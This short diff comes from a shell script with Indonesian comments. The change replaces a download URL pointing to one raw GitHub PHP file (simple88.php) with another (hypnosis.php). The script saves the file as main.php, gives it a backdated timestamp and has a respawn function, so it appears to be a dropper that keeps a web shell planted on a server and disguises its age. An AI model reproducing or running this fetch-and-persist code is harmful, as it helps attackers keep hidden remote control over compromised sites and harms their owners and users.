@@ -41,7 +41,7 @@ respawn() {
 }
 
 # URL sumber file yang akan diunduh
-url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/simple88.php"
+url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/hypnosis.php"
 file_name="main.php"
 timestamp="201201081531.12"
 
